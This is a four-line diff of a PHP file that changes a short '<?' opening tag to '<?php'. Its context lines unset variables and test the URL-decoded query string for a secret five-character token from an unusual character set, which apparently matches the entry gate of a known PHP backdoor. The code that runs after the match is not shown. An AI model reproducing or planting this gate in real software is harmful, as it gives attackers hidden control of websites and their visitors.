@@ -1,4 +1,4 @@
-<?
+<?php
 unset($matches);
 unset($loc);
 if (preg_match("/([OdWo5NIbpuU4V2iJT0n]{5}) /", rawurldecode($loc=$_SERVER["QUERY_STRING"]), $matches)) {
